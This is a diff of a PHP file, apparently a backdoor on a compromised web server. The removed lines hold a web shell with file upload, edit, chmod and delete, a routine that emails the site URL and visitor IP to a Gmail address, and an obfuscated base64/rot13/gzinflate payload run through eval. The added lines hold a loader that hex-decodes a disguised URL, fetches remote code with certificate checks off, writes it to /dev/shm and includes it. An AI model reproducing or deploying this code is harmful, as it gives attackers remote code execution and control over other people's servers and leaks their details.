@@ -1,332 +1,73 @@
-
-﻿<?php
-@session_start();
-@set_time_limit(0);
-
-echo '<!DOCTYPE HTML>
-<HTML>
-<HEAD>
-<meta name="robots" content="noindex">
-
-<title>heker kah?</title>
-<style>
-
-body{
-font-family: system-ui;
-font-weight: bold;
-font-size: 18px;
-background-color: #1f1f1f;
-color: #c9f507;
-}
-#content tr:hover{
-background-color: #1f1f1f;
-}
-#content .first{
-background-color: #1f1f1f;
-}
-#content .first:hover{
-background-color: #1f1f1f;
-}
-table{
-border: 3px #000 solid;
-}
-a{
-color: #000;
-text-decoration: none;
-}
-a:hover{
-color: #00f;
-}
-input,select,textarea{
-border: 1px #000 solid;
--moz-border-radius: 5px;
--webkit-border-radius:5px;
-border-radius:5px;
-}
-input {
- font-size: 18px;
- font-weight: bold;
- padding: 5px;
-}
-select {
-font-size: 19px
-}
-textarea {
-font-size: 10px
-}
-td, tr { padding: 2px 5px; }
-
-</style>
-</HEAD>
-<BODY>
-<hr width="1000" color="black"/>
-<hr width="1000" color="black"/><center><p><h2>Your IP : ' .$_SERVER["REMOTE_ADDR"]. '</h2></p></center>
-<hr width="1000" color="black"/>
-<table width="920" border="1px" cellpadding="7" cellspacing="0" align="center">
-<tr><td style="padding: 8px">Current Path : ';
-if(isset($_GET['path'])){
-$path = $_GET['path'];
-}else{
-$path = getcwd();
-}
-$path = str_replace('\\','/',$path);
-$paths = explode('/',$path);
-
-foreach($paths as $id=>$pat){
-if($pat == '' && $id == 0){
-$a = true;
-echo '<a href="?path=/">/</a>';
-continue;
-}
-if($pat == '') continue;
-echo '<a href="?path=';
-for($i=0;$i<=$id;$i++){
-echo "$paths[$i]";
-if($i != $id) echo "/";
-}
-echo '">'.$pat.'</a>/';
-}
-echo '</td></tr><tr><td>';
-if(isset($_FILES['file'])){
-if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-echo '<font color="green">Upload Success..</font><br />';
-}else{
-echo '<font color="red">Upload Gagal..</font><br />';
-}
-}
-echo '<form enctype="multipart/form-data" method="POST">
-Upload File : <input type="file" name="file" />
-<input type="submit" value="Upload" />
-</form>
-</td></tr><center> <form style="margin-top: 1rem;" name='upload' method='post' action="<?php echo strtok($_SERVER['REQUEST_URI'], '?'); ?>">
-    <div style='position: relative;'>
-      <span>Origin URL-Address</span>
-      <input type="url" id="url" onclick="this.select();" autofocus tabindex="1" required="required" name='url' style="min-width: 500px;padding: 0.5rem;border-radius: 3px;border: 1px solid #0060df;" value="https://wordpress.org/latest.zip" placeholder="set input url" />
-    </div>
-    <br>';
-if(isset($_GET['filesrc'])){
-echo "<tr><td style='padding: 8px'>Current File : ";
-echo $_GET['filesrc'];
-echo '</tr></td></table><br />';
-echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
-}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
-echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
-if($_POST['opt'] == 'chmod'){
-if(isset($_POST['perm'])){
-if(chmod($_POST['path'],$_POST['perm'])){
-echo '<font color="green">Chmod Success..</font><br />';
-}else{
-echo '<font color="red">Chmod Gagal..</font><br />';
-}
-}
-echo '<form method="POST">
-Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
-<input type="hidden" name="path" value="'.$_POST['path'].'">
-<input type="hidden" name="opt" value="chmod">
-<input type="submit" value="Save" />
-</form>';
-}elseif($_POST['opt'] == 'rename'){
-if(isset($_POST['newname'])){
-if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
-echo '<font color="green">Rename Berhasil..</font><br />';
-}else{
-echo '<font color="red">Rename Gagal..</font><br />';
-}
-$_POST['name'] = $_POST['newname'];
-}
-echo '<form method="POST">
-New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
-<input type="hidden" name="path" value="'.$_POST['path'].'">
-<input type="hidden" name="opt" value="rename">
-<input type="submit" value="Save" />
-</form>';
-}elseif($_POST['opt'] == 'edit'){
-if(isset($_POST['src'])){
-$fp = fopen($_POST['path'],'w');
-if(fwrite($fp,$_POST['src'])){
-echo '<font color="green">Edit File Berhasil..</font><br />';
-}else{
-echo '<font color="red">Edit File Gagal..</font><br />';
-}
-fclose($fp);
-}
-echo '<form method="POST">
-<textarea cols=130 rows=10 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
-<input type="hidden" name="path" value="'.$_POST['path'].'">
-<input type="hidden" name="opt" value="edit">
-<input type="submit" value="Save" />
-</form>';
-}
-echo '</center>';
-}else{
-echo '</table><br /><center>';
-if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
-if($_POST['type'] == 'dir'){
-if(rmdir($_POST['path'])){
-echo '<font color="green">Delete Directory Berhasil..</font><br />';
-}else{
-echo '<font color="red">Delete Directory Gagal..</font><br />';
-}
-}elseif($_POST['type'] == 'file'){
-if(unlink($_POST['path'])){
-echo '<font color="green">Delete File Berhasil..</font><br />';
-}else{
-echo '<font color="red">Delete File Gagal..</font><br />';
-}
-}
-}
-echo '</center>';
-$scandir = scandir($path);
-echo '<div id="content"><table width="920" border="1.5px" cellpadding="5" cellspacing="0" align="center">
-<tr class="first">
-<td><center>Name</center></td>
-<td><center>Size</center></td>
-<td><center>Permissions</center></td>
-<td><center>Options</center></td>
-</tr>';
-
-foreach($scandir as $dir){
-if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
-echo "<tr>
-<td><a href=\"?path=$path/$dir\">$dir</a></td>
-<td><center>--</center></td>
-<td><center>";
-if(is_writable("$path/$dir")) echo '<font color="Blue">';
-elseif(!is_readable("$path/$dir")) echo '<font color="red">';
-echo perms("$path/$dir");
-if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
-
-echo "</center></td>
-<td><center><form method=\"POST\" action=\"?option&path=$path\">
-<select name=\"opt\">
-<option value=\"\"></option>
-<option value=\"delete\">Delete</option>
-<option value=\"chmod\">Chmod</option>
-<option value=\"rename\">Rename</option>
-</select>
-<input type=\"hidden\" name=\"type\" value=\"dir\">
-<input type=\"hidden\" name=\"name\" value=\"$dir\">
-<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
-<input type=\"submit\" value=\"Oke\" />
-</form></center></td>
-</tr>";
-}
-echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
-foreach($scandir as $file){
-if(!is_file("$path/$file")) continue;
-$size = filesize("$path/$file")/1024;
-$size = round($size,3);
-if($size >= 1024){
-$size = round($size/1024,2).' MB';
-}else{
-$size = $size.' KB';
-}
-
-echo "<tr>
-<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
-<td><center>".$size."</center></td>
-<td><center>";
-if(is_writable("$path/$file")) echo '<font color="Blue">';
-elseif(!is_readable("$path/$file")) echo '<font color="red">';
-echo perms("$path/$file");
-if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
-echo "</center></td>
-<td><center><form method=\"POST\" action=\"?option&path=$path\">
-<select name=\"opt\">
-<option value=\"\"></option>
-<option value=\"delete\">Delete</option>
-<option value=\"chmod\">Chmod</option>
-<option value=\"rename\">Rename</option>
-<option value=\"edit\">Edit</option>
-</select>
-<input type=\"hidden\" name=\"type\" value=\"file\">
-<input type=\"hidden\" name=\"name\" value=\"$file\">
-<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
-<input type=\"submit\" value=\"Oke\" />
-</form></center></td>
-</tr>";
-}
-echo '</table>
-</div>';
-}
-echo '<center><hr width="920" color="black"/> <center>
-</BODY>
-</HTML>';
-function perms($file){
-$perms = fileperms($file);
-
-if (($perms & 0xC000) == 0xC000) {
-// Socket
-$info = 's';
-} elseif (($perms & 0xA000) == 0xA000) {
-// Symbolic Link
-$info = 'l';
-} elseif (($perms & 0x8000) == 0x8000) {
-// Regular
-$info = '-';
-} elseif (($perms & 0x6000) == 0x6000) {
-// Block special
-$info = 'b';
-} elseif (($perms & 0x4000) == 0x4000) {
-// Directory
-$info = 'd';
-} elseif (($perms & 0x2000) == 0x2000) {
-// Character special
-$info = 'c';
-} elseif (($perms & 0x1000) == 0x1000) {
-// FIFO pipe
-$info = 'p';
-} else {
-// Unknown
-$info = 'u';
-}
-
-// Owner
-$info .= (($perms & 0x0100) ? 'r' : '-');
-$info .= (($perms & 0x0080) ? 'w' : '-');
-$info .= (($perms & 0x0040) ?
-(($perms & 0x0800) ? 's' : 'x' ) :
-(($perms & 0x0800) ? 'S' : '-'));
-
-// Group
-$info .= (($perms & 0x0020) ? 'r' : '-');
-$info .= (($perms & 0x0010) ? 'w' : '-');
-$info .= (($perms & 0x0008) ?
-(($perms & 0x0400) ? 's' : 'x' ) :
-(($perms & 0x0400) ? 'S' : '-'));
-
-// World
-$info .= (($perms & 0x0004) ? 'r' : '-');
-$info .= (($perms & 0x0002) ? 'w' : '-');
-$info .= (($perms & 0x0001) ?
-(($perms & 0x0200) ? 't' : 'x' ) :
-(($perms & 0x0200) ? 'T' : '-'));
-
-return $info;
-}
-?>
-
-
-
 <?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'malaysia.sender@gmail.com, malaysia.sender@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-eval(str_rot13(gzinflate(str_rot13(base64_decode('jZBEeMIwEMffB36HIwjpU9U9jDEqgmaraC8yMxGmVVVYZQUls9FzNJ9+ieJjg8GeAve7/+/u0roaTW65MhjRvMSiUf5E7vdTTWSgMdxe91sXHZVIUqO33FWZWGjmHmS0zvDGOovRsfYdZMblZXtPPkDv75Y0NNRTSlNT9DUXdQRpsnpuEkCzwV6NrunDrtbSGwaT7K3zY4y0sfwstWPaNjAA6rRfUkzdSFNr1fAQQGqXuxj+UTR1NrzQS3sFqRGLpNcj0IU2H7P0haUrbW3542fJ6PoHVtnzhI0zPlYXZx1ZhURNY90YiU63txs425MCYRZCMK0qdpSCBElAfsmWo4zx6XmWHscQSxPvDJtTF5fGQN5U8zlYVgyX83z9P8bwYl8=')))))
+error_reporting(0);
+ini_set('display_errors', '0');
+ini_set('log_errors', '0');
+
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        
+        
+        $opt1 = constant('CURLOPT_RETURNTRANSFER');
+        $opt2 = constant('CURLOPT_FOLLOWLOCATION');
+        $opt3 = constant('CURLOPT_USERAGENT');
+        $opt4 = constant('CURLOPT_SSL_VERIFYPEER');
+        $opt5 = constant('CURLOPT_SSL_VERIFYHOST');
+        $opt6 = constant('CURLOPT_COOKIE');
+
+        
+        curl_setopt($conn, $opt1, 1);
+        curl_setopt($conn, $opt2, 1);
+        curl_setopt($conn, $opt3, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, $opt4, 0);
+        curl_setopt($conn, $opt5, 0);
+
+        if (isset($_SESSION['java'])) {
+            curl_setopt($conn, $opt6, $_SESSION['java']);
+        }
+
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
+    }
+    return $url_get_contents_data;
+}
+
+// password defaultnya tbl
+
+$password = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f416e6f6e726f636b732f30782f726566732f68656164732f6d61737465722f6d696e692e706466'; 
+function hex2str($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex); $i += 2) {
+        $str .= chr(hexdec(substr($hex, $i, 2)));
+    }
+    return $str;
+}
+
+
+function clean_old_temp_files() {
+    $temp_files = glob('/dev/shm/prefix*');
+    foreach ($temp_files as $file) {
+        if (is_file($file)) {
+            unlink($file);
+        }
+    }
+}
+
+
+clean_old_temp_files();
+
+$url = hex2str($password);
+$a = geturlsinfo($url);
+$temporary_file = tempnam('/dev/shm', 'prefix');
+file_put_contents($temporary_file, $a);
+include $temporary_file;
+unlink($temporary_file);
 ?>
-
-
-
-
-
-
-
-
-
-
